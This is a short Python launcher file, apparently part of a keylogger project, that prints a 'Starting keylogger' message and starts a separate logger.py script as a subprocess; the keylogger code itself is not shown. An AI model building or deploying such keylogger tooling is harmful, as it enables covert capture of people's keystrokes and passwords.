# cli.py
import subprocess
import sys

def start_logger():
    print("[*] Starting keylogger...")
    subprocess.Popen([sys.executable, "logger.py"])

if __name__ == "__main__":
    start_logger()

